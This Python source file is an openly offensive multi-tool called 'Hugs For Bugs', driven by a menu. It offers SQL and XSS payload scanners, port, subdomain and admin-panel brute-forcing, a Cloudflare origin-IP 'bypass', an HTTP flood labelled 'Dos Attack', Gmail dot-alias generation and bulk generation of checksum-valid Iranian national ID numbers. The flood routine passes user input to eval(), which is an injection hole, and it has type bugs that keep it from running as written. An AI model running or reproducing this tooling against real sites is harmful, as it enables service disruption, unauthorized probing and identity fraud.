import os
import re
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from colorama import Fore
import requests
from bs4 import BeautifulSoup
import tldextract
from scapy.all import *
import dns.resolver
import random
import string
import socket
import time
import getpass
from urllib.parse import urlparse
from threading import Thread
import whois
import webbrowser

def clear_console():
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

storage = []

City_codes = ["169", "170", "149", "150", "171", "168", "136", "137", "138", "545", "505", "636", "164", "165", "172", "623", "506", "519", "154", "155", "567", "173", "159", "160", "604", "274", "275", "295", "637", "292", "492", "289", "677", "294", "493", "279", "280", "288", "284", "285", "638", "291", "640", "293", "675", "282", "283", "286", "287", "296", "297", "290", "400", "401", "404", "405", "397", "398", "399", "647", "502", "584", "402", "403", "392", "393", "395", "396", "386", "387", "503", "444", "551", "447", "561", "445", "718", "083", "446", "448", "552", "543", "242", "443", "051", "052", "053", "058", "055", "617", "057", "618", "059", "060", "061", "062", "544", "056", "571", "593", "667", "348", "586", "338", "339", "343", "344", "346", "337", "554", "469", "537", "345", "470", "341", "342", "483", "484", "557", "418", "416", "417", "412", "413", "592", "612", "613", "406", "407", "421", "598", "419", "385", "420", "528", "213", "214", "205", "206", "498", "568", "711", "217", "218", "221", "582", "483", "625", "576", "578", "227", "208", "209", "225", "577", "712", "215", "216", "626", "627", "579", "713", "499", "222", "219", "220", "500", "501", "623", "497", "223", "689", "487", "226", "224", "486", "211", "212", "628", "202", "203", "531", "488", "261", "273", "630", "264", "518", "631", "258", "259", "570", "265", "268", "269", "653", "517", "569", "267", "262", "263", "593", "266", "693", "271", "272", "694", "270", "516", "333", "334", "691", "323", "322", "595", "395", "641", "596", "336", "335", "496", "337", "324", "325", "394", "330", "332", "331", "687", "422", "423", "599", "600", "688", "424", "425", "426", "550", "697", "384", "377", "378", "558", "385", "646", "375", "376", "372", "373", "379", "380", "383", "674", "381", "382", "676", "722", "542", "312", "313", "317", "310", "311", "302", "303", "583", "321", "382", "304", "305", "536", "605", "308", "309", "306", "307", "319", "313", "314", "606", "320", "698", "298", "299", "535", "315", "316", "318", "607", "608", "508", "538", "728", "509", "438", "439", "580", "590", "559", "588", "431", "432", "037", "038", "702", "240", "241", "670", "648", "252", "678", "253", "649", "513", "546", "671", "246", "247", "654", "548", "547", "655", "248", "249", "253", "514", "665", "673", "228", "229", "230", "679", "256", "257", "244", "245", "681", "723", "236", "237", "683", "656", "250", "251", "515", "243", "242", "238", "239", "657", "255", "684", "700", "642", "457", "456", "458", "459", "460", "530", "520", "358", "359", "682", "703", "364", "365", "371", "701", "720", "366", "367", "704", "361", "362", "369", "370", "635", "668", "533", "705", "699", "669", "725", "597", "611", "525", "181", "527", "585", "685", "663", "192", "193", "174", "175", "183", "184", "481", "706", "194", "195", "185", "186", "182", "199", "200", "198", "662", "190", "191", "692", "189", "707", "526", "187", "188", "279", "730", "196", "191", "730", "196", "197", "661", "680", "643", "562", "572", "074", "644", "072", "073", "069", "070", "521", "573", "522", "724", "076", "077", "650", "574", "078", "079", "081", "086", "651", "086", "087", "089", "090", "553", "091", "092", "093", "094", "097", "098", "096", "105", "106", "063", "067", "068", "075", "591", "082", "635", "524", "468", "465", "461", "462", "467", "632", "555", "633", "629", "466", "696", "721", "064", "065", "523", "652", "719", "716", "085", "088", "566", "529", "353", "349", "350", "355", "609", "351", "352", "354", "732", "357", "532", "610"]



loader_screen = r"""
                        xXXXXXXXXXXx
                      xX            Xx
                     X                X
                    X      XxXXxX      X
                   X        x  x       X
                   X         XX         X
          XX       X  /~~\        /~~\  X       XX
        XX  X      X |  o  \    /  o  | X      X  XX
      XX     X     X  \____/    \____/  X     X     XX
 XXXXX     XX      \         /\        ,/      XX     XXXXX
X        XX%;;@      \      /  \     ,/      @%%;XX        X
X       X  @%%;;@     X              X     @%%;;@  X       X
X      X     @%%;;@   X  ;  ;  ;  ;  X   @%%;;@     X      X
 X    X        @%%;;@                  @%%;;@        X    X
  X   X          @%%;;@              @%%;;@          X   X
   X  X            @%%;;@          @%%;;@            X  X
    XX X             @%%;;@      @%%;;@             X XX
      XXX              @%%;;@  @%%;;@              XXX
                         @%%;;%%;;@
                           @%%;;@
                         @%%;;@..@@
                          @@@  @@@

                  Hugs For Bugs Development
"""[1:]



def banner():
    print(f'''{Fore.LIGHTBLUE_EX}
                                        ┓┏       ┏┓      ┳┓       
                                        ┣┫┓┏┏┓┏  ┣ ┏┓┏┓  ┣┫┓┏┏┓┏  
                                        ┛┗┗┻┗┫┛  ┻ ┗┛┛   ┻┛┗┻┗┫┛  
                                             ┛                ┛   
                {Fore.LIGHTBLUE_EX}╔═════════════════════╦══════════════════════╦════════════════════════╗
                {Fore.LIGHTBLUE_EX}║  {Fore.LIGHTBLUE_EX}[{Fore.WHITE}01{Fore.LIGHTBLUE_EX}]{Fore.WHITE} SQL Scan      {Fore.LIGHTBLUE_EX}║  {Fore.LIGHTBLUE_EX}[{Fore.WHITE}02{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Xss Scanner    {Fore.LIGHTBLUE_EX}║ {Fore.LIGHTBLUE_EX}[{Fore.WHITE}03{Fore.LIGHTBLUE_EX}]{Fore.WHITE} NetWork Scanner   {Fore.LIGHTBLUE_EX}║
                {Fore.LIGHTBLUE_EX}║  {Fore.LIGHTBLUE_EX}[{Fore.WHITE}04{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Admin Finder  {Fore.LIGHTBLUE_EX}║  {Fore.LIGHTBLUE_EX}[{Fore.WHITE}05{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Sub Scan       {Fore.LIGHTBLUE_EX}║ {Fore.LIGHTBLUE_EX}[{Fore.WHITE}06{Fore.LIGHTBLUE_EX}]{Fore.WHITE} RoBot Finder      {Fore.LIGHTBLUE_EX}║
                {Fore.LIGHTBLUE_EX}║  {Fore.LIGHTBLUE_EX}[{Fore.WHITE}07{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Tcp Ping      {Fore.LIGHTBLUE_EX}║  {Fore.LIGHTBLUE_EX}[{Fore.WHITE}08{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Udp Ping       {Fore.LIGHTBLUE_EX}║ {Fore.LIGHTBLUE_EX}[{Fore.WHITE}09{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Dos Attack        {Fore.LIGHTBLUE_EX}║
                {Fore.LIGHTBLUE_EX}║  {Fore.LIGHTBLUE_EX}[{Fore.WHITE}10{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Get Html      {Fore.LIGHTBLUE_EX}║  {Fore.LIGHTBLUE_EX}[{Fore.WHITE}11{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Cl Bypass      {Fore.LIGHTBLUE_EX}║ {Fore.LIGHTBLUE_EX}[{Fore.WHITE}12{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Gmail Dot         {Fore.LIGHTBLUE_EX}║
                {Fore.LIGHTBLUE_EX}║  {Fore.LIGHTBLUE_EX}[{Fore.WHITE}13{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Meli Gen Bot  {Fore.LIGHTBLUE_EX}║  {Fore.LIGHTBLUE_EX}[{Fore.WHITE}14{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Who Is Domain  {Fore.LIGHTBLUE_EX}║ {Fore.LIGHTBLUE_EX}[{Fore.WHITE}15{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Support           {Fore.LIGHTBLUE_EX}║
                {Fore.LIGHTBLUE_EX}╚═════════════════════╩══════════════════════╩════════════════════════╝
{Fore.RESET}''')

def tbanner():
    print(f'''{Fore.LIGHTBLUE_EX}
                                        ┓┏       ┏┓      ┳┓       
                                        ┣┫┓┏┏┓┏  ┣ ┏┓┏┓  ┣┫┓┏┏┓┏  
                                        ┛┗┗┻┗┫┛  ┻ ┗┛┛   ┻┛┗┻┗┫┛  
                                             ┛                ┛   
''')    

def XssCon(url, payloads):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        for payload in payloads:
            if payload in response.text:
                print(f"Potential XSS vulnerability found in {url} with payload: {payload}")

            if soup.find(text=payload):
                print(f"Potential XSS vulnerability found in {url} with payload: {payload}")

    except requests.exceptions.RequestException as e:
        print(f"Error occurred while scanning {url}: {str(e)}")

def xss_main():
    target_site = input("Enter the target site (e.g., http://www.example.com): ")
    target_urls = [f"{target_site}/{page}" for page in ['page1', 'page2']]  # Modify the list of pages as needed

    payloads_file = os.path.join("data", "dataxsspayload.txt")
    with open(payloads_file, 'r') as file:
        payloads = [line.strip() for line in file.readlines()]

    for url in target_urls:
        XssCon(url, payloads)

def sql_url(url, payloads):
    try:
        for payload in payloads:
            modified_url = url.replace("[INJECTION_POINT]", payload)
            response = requests.get(modified_url)

            # Analyze the response for signs of SQL injection vulnerability
            if "error" in response.text:
                print(f"Potential SQL injection vulnerability found in {url} with payload: {payload}")

    except requests.exceptions.RequestException as e:
        print(f"Error occurred while scanning {url}: {str(e)}")

def sql_main():
    data_dir = "data"
    payloads_file = os.path.join(data_dir, "sqlpayload.txt")

    if not os.path.exists(data_dir):
        print(f"Error: '{data_dir}' directory does not exist.")
        return

    if not os.path.isfile(payloads_file):
        print(f"Error: '{payloads_file}' file does not exist.")
        return

    target_urls = input("Enter target URLs (separated by commas): ").split(",")

    with open(payloads_file, 'r') as file:
        payloads = [line.strip() for line in file.readlines()]

    for url in target_urls:
        sql_url(url.strip(), payloads)

def scan_network(target_ip, port_range):
    open_ports = []

    for port in port_range:
        packet = IP(dst=target_ip) / TCP(dport=port, flags="S")

        # Send the packet and receive the response
        response = sr1(packet, timeout=1, verbose=0)

        if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
            open_ports.append(port)

    return open_ports

def network_main():
    target_ip = input("Enter the target IP address: ")
    start_port = int(input("Enter the starting port number: "))
    end_port = int(input("Enter the ending port number: "))

    port_range = range(start_port, end_port + 1)

    open_ports = scan_network(target_ip, port_range)

    if open_ports:
        print("Open ports found:")
        for port in open_ports:
            print(f"Port {port} is open.")
    else:
        print("No open ports found.")


def scan_subdomains(domain):
    subdomains = []

    common_subdomains_file = os.path.join("data", "subdomain.txt")
    with open(common_subdomains_file, 'r') as file:
        common_subdomains = [line.strip() for line in file.readlines()]

    for subdomain in common_subdomains:
        subdomain_name = subdomain + '.' + domain
        try:
            answers = dns.resolver.resolve(subdomain_name, 'A')
            if answers:
                subdomains.append(subdomain_name)
        except dns.resolver.NXDOMAIN:
            pass

    return subdomains

def subdomains_main():
    domain = input("Enter the domain name: ")
    subdomains = scan_subdomains(domain)

    if subdomains:
        print("Subdomains found:")
        for subdomain in subdomains:
            print(subdomain)
    else:
        print("No subdomains found.")



def find_admin_panel(url):
    admin_panel_keywords = []

    keyword_file = os.path.join("data", "keyword.txt")
    with open(keyword_file, 'r') as file:
        admin_panel_keywords = [line.strip() for line in file.readlines()]

    for keyword in admin_panel_keywords:
        admin_url = url + '/' + keyword
        response = requests.get(admin_url)

        if response.status_code == 200:
            print(f"Admin panel found: {admin_url}")

def adminf_main():
    url = input("Enter the base URL: ")
    find_admin_panel(url)




def get_html(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        html_content = response.text
        return html_content
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def save_html_content(html_content, output_directory):
    try:
        os.makedirs(output_directory, exist_ok=True)  # Create the output directory if it doesn't exist
        file_path = os.path.join(output_directory, 'output.html')
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(html_content)
        print(f"HTML content saved to {file_path}")
    except Exception as e:
        print(f"Error occurred while saving HTML content: {str(e)}")

def download_file(url, output_directory):
    response = requests.get(url)
    if response.status_code == 200:
        file_name = os.path.basename(url)
        file_path = os.path.join(output_directory, file_name)
        with open(file_path, 'wb') as file:
            file.write(response.content)
        print(f"File downloaded: {file_path}")
        return file_name
    else:
        print(f"Failed to download file: {url}")
        return None

def get_js_css_files(url, output_directory):
    response = requests.get(url)
    if response.status_code == 200:
        base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        html_content = response.text

        downloaded_files = []

        # Find and download JS files
        js_files = re.findall(r'<script[^>]*src="([^"]+)"', html_content)
        for js_file in js_files:
            file_url = f"{base_url}/{js_file}"
            downloaded_file = download_file(file_url, output_directory)
            if downloaded_file:
                downloaded_files.append(downloaded_file)

        # Find and download CSS files
        css_files = re.findall(r'<link[^>]*href="([^"]+)"', html_content)
        for css_file in css_files:
            file_url = f"{base_url}/{css_file}"
            downloaded_file = download_file(file_url, output_directory)
            if downloaded_file:
                downloaded_files.append(downloaded_file)

        return downloaded_files
    else:
        print(f"Failed to fetch webpage: {url}")
        return []

def html_main():
    url = input("Enter the website URL: ")
    output = input("Enter the output folder: ")
    output_directory = output.strip()  # Remove leading/trailing whitespaces from the output folder
    html_content = get_html(url)

    if html_content:
        save_html_content(html_content, output_directory)

        downloaded_files = get_js_css_files(url, output_directory)
        print("Downloaded files:")
        for file_name in downloaded_files:
            print(file_name)


def tcp_ping(host, port, timeout=2):
    try:
        # Create a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        # Start the timer
        start_time = time.time()

        # Connect to the target host
        sock.connect((host, port))

        # Calculate the round-trip time
        rtt = time.time() - start_time

        print(f"TCP Ping to {host}:{port} succeeded. RTT: {rtt:.3f} seconds")

    except socket.timeout:
        print(f"TCP Ping to {host}:{port} timed out")

    except ConnectionRefusedError:
        print(f"TCP Ping to {host}:{port} failed. Connection refused")

    except Exception as e:
        print(f"An error occurred: {str(e)}")

    finally:
        # Close the socket
        sock.close()

def tcp_main():
    host = input("Enter the target host: ")
    port = int(input("Enter the target port: "))

    tcp_ping(host, port)


def udp_ping(host, port, timeout=2):
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)

        # Start the timer
        start_time = time.time()

        # Send an empty UDP packet to the target host
        sock.sendto(b'', (host, port))

        # Receive the response packet
        data, addr = sock.recvfrom(1024)

        # Calculate the round-trip time
        rtt = time.time() - start_time

        print(f"UDP Ping to {host}:{port} succeeded. RTT: {rtt:.3f} seconds")

    except socket.timeout:
        print(f"UDP Ping to {host}:{port} timed out")

    except Exception as e:
        print(f"An error occurred: {str(e)}")

    finally:
        # Close the socket
        sock.close()

def udp_main():
    host = input("Enter the target host: ")
    port = int(input("Enter the target port: "))

    udp_ping(host, port)


def find_robot_txt(url):
    try:
        # Construct the robot.txt file URL
        robot_url = url + '/robots.txt'
        response = requests.get(robot_url)

        if response.status_code == 200:
            print(f"robots.txt found at: {robot_url}")
            print("Content:")
            print(response.text)
        else:
            print(f"robots.txt not found at: {robot_url}")

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def robot_main():
    url = input("Enter the website URL: ")
    find_robot_txt(url)

def read_robot_from_file():
    keyword_files = os.path.join("data", "robot.txt")
    with open(keyword_files, 'r') as file:
        robot_url = file.read().strip()
    return robot_url



def cloudflare():
    subdom = ['ftp', 'cpanel', 'webmail', 'localhost', 'local', 'mysql', 'forum', 'driect-connect', 'blog', 'vb', 'forums', 'home', 'direct', 'forums', 'mail', 'access', 'admin', 'administrator', 'email', 'downloads', 'ssh', 'owa', 'bbs', 'webmin', 'paralel', 'parallels', 'www0', 'www', 'www1', 'www2', 'www3', 'www4', 'www5', 'shop', 'api', 'blogs', 'test', 'mx1', 'cdn', 'mysql', 'mail1', 'secure', 'server', 'ns1', 'ns2', 'smtp', 'vpn', 'm', 'mail2', 'postal', 'support', 'web', 'dev']

    site = input(f"{Fore.BLUE}[Bugs]{Fore.RESET} Enter The Target Website Address :")
    if site == "":
        try:
            print(Fore.RED+" [!] "+Fore.BLUE+"Please Enter Address :) \n")
            time.sleep(3)
        except:
            return
    for sub in subdom:
        try:
            hosts = str(sub) + "." + str(site)
            bypass = socket.gethostbyname(str(hosts))
            print (" [!] CloudFlare Bypass " + str(bypass) + ' | ' + str(hosts))
        except Exception:
            pass


def dev_info():
    print(f'''
    {Fore.LIGHTBLUE_EX}•{Fore.RESET} Coding training for 6 years, after changing jobs.
    {Fore.LIGHTBLUE_EX}•{Fore.RESET} I started with Python, but I was really interested in developing Backend ...
    {Fore.LIGHTBLUE_EX}•{Fore.RESET} I'm based in iran     
    {Fore.LIGHTBLUE_EX}•{Fore.RESET} You can contact me at sikada1997
    {Fore.LIGHTBLUE_EX}•{Fore.RESET} I'm learning Ruby & Rust & PhP
    {Fore.LIGHTBLUE_EX}•{Fore.RESET} I'm open to collaborating on Security of social networks and websites
    {Fore.LIGHTBLUE_EX}•{Fore.RESET} Fun fact I also draw, cook and play games ;)
    {Fore.LIGHTBLUE_EX}•{Fore.RESET} Github : github.com/imk4sra
    {Fore.LIGHTBLUE_EX}•{Fore.RESET} Discord ID : https://discord.com/users/357233919285919746 
    {Fore.LIGHTBLUE_EX}•{Fore.RESET} Discord Server : https://discord.gg/sH5kYZRYTT
''')



def dos_attack():
    global url, time, file

    url = input(Fore.BLUE+"Target URL : ")

    time    = input(Fore.BLUE+"Attack Time : ")

    threads = input(Fore.BLUE+"Packet : ")

    global breakFlag
    breakFlag = False

    print(f'{Fore.BLUE} Sending Packet to : {Fore.RED}{url}')

    def attack(request):
        global url, time, file
        i = 0
        while True:
            try:
                req = eval("requests."+request+"('"+url+"')")
                print(f'{Fore.GREEN}[+]{Fore.RED} Sending Atack To {Fore.BLUE}{url} {Fore.RED}Thread : {Fore.BLUE}{threads}')
            except:
                print(f'{Fore.RED}[-]{Fore.BLUE} Atack Has Ben Errored')
            i+=1
            if time != 0:
                if i>time:
                    break

    def createThreadings():
        global breakFlag
        try:
            Thread(target=lambda: attack("get")).start()
            Thread(target=lambda: attack("put")).start()
            Thread(target=lambda: attack("delete")).start()
            Thread(target=lambda: attack("options")).start()
            Thread(target=lambda: attack("post")).start()
        except:
            breakFlag = True

    if(threads != 0):
        for i in range(threads):
            createThreadings()
    else:
        while True:
            createThreadings()
            if(breakFlag):
                break

def ask_username():
    username = ""
    while not username:
        temp = input("Enter Gmail Without (@Gmail.com) : ")
        if "@" in temp:
            clear_console()
            banner()
            print(" >  @ Remove This :)")
            time.sleep(1.5)
        else:
            clear_console()
            banner()

            username = temp
    return username


def shuffle(obj, init_pos):
    global storage
    temp = ""
    for i in range(init_pos, len(obj)):
        temp = obj[:i] + "." + obj[i:]
        if temp not in storage:
            if ".." not in temp:
                storage.append(temp)
                shuffle(temp, init_pos+2)
    return storage

def Check_MeliCode(code):
    if not re.match('^[0-9]{10}$', code):
        return False
    for i in range(10):
        if re.match(f'^{i}{{10}}$', code):
            return False
    sum = 0
    for i in range(9):
        sum += (10 - i) * int(code[i])
    ret = sum % 11
    parity = int(code[9])
    if (ret < 2 and ret == parity) or (ret >= 2 and ret == 11 - parity):
        return True
    return False

def Fix(Number):
    if len(Number) < 7:
        return "0" * (7 - len(Number)) + Number
    else:
        return Number


def perform_whois_lookup(domain_name):
    try:
        w = whois.whois(domain_name)
        
        print("Domain Name:", w.domain_name)
        print("Registrar:", w.registrar)
        print("Creation Date:", w.creation_date)
        print("Expiration Date:", w.expiration_date)
        print("Name Servers:", w.name_servers)
        print("Registrant:", w.registrant)
        
    except whois.parser.PywhoisError as e:
        print("Error:", str(e))

Anime.Fade(Center.Center(loader_screen), Colors.red_to_blue, Colorate.Vertical, enter=True)
def start():
    clear_console()
    banner()
    choices = input(Fore.LIGHTBLUE_EX+" ┌─["+Fore.LIGHTGREEN_EX+"Hugs For Bugs"+Fore.BLUE+"~"+Fore.WHITE+"@Choice Option"+Fore.LIGHTBLUE_EX+"""]
 └──╼ """+Fore.WHITE+"> ")
    if choices == ' ':
        print(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Choice An Options !')
        time.sleep(2)
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back')
        start()
    if choices == '1':
        clear_console()
        banner()
        sql_main()
    if choices == '2':
        clear_console()
        tbanner()
        xss_main()
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start() 
    if choices == "3":
        clear_console()
        tbanner()
        network_main()
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start()        
    if choices == "4":
        clear_console()
        tbanner()
        adminf_main()
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start()      
    if choices == "5":
        clear_console()
        tbanner()
        subdomains_main()
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start()      
    if choices == "6":
        clear_console()
        tbanner()
        robot_url = read_robot_from_file()
        if robot_url:
            print("Robot.txt URL from file:")
            print(robot_url)
            robot_main()
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start()      
    if choices == "7":
        clear_console()
        tbanner()
        tcp_main()
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start()      
    if choices == "8":
        clear_console()
        tbanner()
        udp_main()
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start()      
    if choices == "9":
        clear_console()
        tbanner() 
        dos_attack()
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start()      
    if choices == "10":
        clear_console()
        tbanner() 
        html_main()
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start() 
    if choices == "11":
        clear_console()
        tbanner() 
        cloudflare()
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start() 
    if choices == "12":
        clear_console()
        tbanner() 
        target = ask_username().replace(".", "")
        shuffle(target, 1)
        file = open('Data/GmailDot.txt', 'w')
        for i in storage:
            temp = str(i) + "@gmail.com"
            file.write(temp)
            file.write("\n")
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start() 
    if choices == "13":
        clear_console()
        tbanner()
        City_codes_input = input("Enter City codes (comma-separated): ")
        City_codes = [code.strip() for code in City_codes_input.split(',')]
        Gennumber = input("Enter Generate number: ")

        try:
            Gennumber = int(Gennumber)
        except ValueError:
            print("Invalid input for Generate number. Please enter a valid integer.")
            exit(1)

        for City_code in City_codes:
            with open(f'{City_code}.lst', 'w') as File:
                for i in range(Gennumber, 10000000):
                    code = City_code + Fix(str(i))
                    if Check_MeliCode(code):
                        print(code)
                        File.write(code + "\n")

        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start()  
    if choices == "14":
        clear_console()
        tbanner()
        domain = input(f'{Fore.LIGHTBLUE_EX}[+]{Fore.RESET} Enter Domain To LockUp: ')  
        perform_whois_lookup(domain)
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start()  
    if choices == "15":
        clear_console()
        tbanner()
        dev_info()
        print("\n\n")
        disinput = input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Do You Want Join In Developer Discord ? (Y/N)')
        if disinput == "Y" or disinput == "y":
            webbrowser.open('https://discord.gg/w9dRedmEPx')
        if disinput == "N" or disinput == "n":
            pass
        input(f'{Fore.LIGHTBLUE_EX}[Hugs For Bugs]{Fore.RESET} Press Enter To Back To Main Menu')   
        start()      

if __name__ == "__main__":
    start()